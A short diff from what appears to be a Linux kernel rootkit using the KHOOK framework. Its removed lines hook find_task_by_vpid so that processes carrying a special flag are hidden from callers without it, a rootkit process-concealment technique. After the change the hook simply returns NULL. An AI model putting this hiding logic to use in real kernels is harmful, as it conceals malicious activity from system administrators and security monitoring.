@@ -90,11 +90,6 @@ KHOOK(find_task_by_vpid);
 struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 {
 	struct task_struct *tsk = NULL;
-	printk("HOOK SUCCESS");
-	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
-	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
-		tsk = NULL;
-
 	return tsk;
 }
 /*
